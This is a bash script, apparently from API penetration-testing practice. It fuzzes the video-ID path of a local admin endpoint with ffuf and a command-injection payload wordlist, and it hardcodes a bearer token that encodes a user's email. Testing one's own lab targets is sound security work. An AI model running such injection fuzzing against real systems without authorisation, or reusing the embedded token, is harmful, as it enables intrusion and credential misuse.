#!/bin/bash

# Test command injection in GET request for video ID parameter
echo "Testing command injection in GET /identity/api/v2/admin/videos/FUZZ"
echo "===================================================================="

# Test in the URL path (video ID)
ffuf -w SecLists/Fuzzing/command-injection-commix.txt \
  -u "http://localhost:8888/identity/api/v2/admin/videos/5252FUZZ" \
  -X GET \
  -H "Host: localhost:8888" \
  -H "Cache-Control: max-age=0" \
  -H 'sec-ch-ua: "Not)A;Brand";v="8", "Chromium";v="138"' \
  -H "sec-ch-ua-mobile: ?0" \
  -H 'sec-ch-ua-platform: "macOS"' \
  -H "Accept-Language: en-US,en;q=0.9" \
  -H "Upgrade-Insecure-Requests: 1" \
  -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36" \
  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJvbXJpbnVyaUBnbWFpbC5jb20iLCJpYXQiOjE3NTI3NzAxODcsImV4cCI6MTc1MzM3NDk4Nywicm9sZSI6InVzZXIifQ.PgtHLMYqS9cSL_sUr9GcVaZzJntD4efh4zM2ppvKqRRv9CBwCsWdnIct39trp4fPTSLy8_uAZm4b7hSE_-4bgcxgmFxJ4d4bP6rjuQdeBGgMpmqhlvgDGrlxfYpKDFIsmpEEHvqOVud58Sv1zrr3xpSoVWwYtJX8uBa1yCS-wjbxO_Chjo79EUB8zG_22Po3HZyooTIfi0ce3x0UWIg7CKUYltVa85izjsofyI9TesyxnrB1gEQylpZeZjVnPwC4bIalWdWIep8ecu8H2BjD0Dt6aQ2RyPAIT8mRpK5xh6LUgUdxzCxaZ3M74ZLXgw8p8lp0AgqO7Fl7Qn80UXmqSw" \
  -H "Sec-Fetch-Site: same-origin" \
  -H "Sec-Fetch-Mode: navigate" \
  -H "Sec-Fetch-User: ?1" \
  -H "Sec-Fetch-Dest: document" \
  -H "Accept-Encoding: gzip, deflate, br" \
  -H "Connection: keep-alive" \
  -mc all \
  -o get_results.txt \
  -of json